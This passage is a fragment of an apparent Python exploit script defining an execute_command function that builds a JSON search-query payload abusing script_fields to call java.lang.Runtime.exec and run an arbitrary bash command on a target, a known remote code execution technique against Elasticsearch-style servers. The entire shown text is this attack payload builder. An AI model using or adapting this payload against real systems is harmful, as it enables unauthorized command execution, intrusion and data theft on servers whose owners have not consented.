...
def execute_command(target, command):
    payload = """{"size":1, "script_fields": {"lupin":{"script": "def cmds=[\\"bash\\",\\"-c\\",\\"%s\\"] as String[];java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(cmds).getText()"}}}""" %(command)
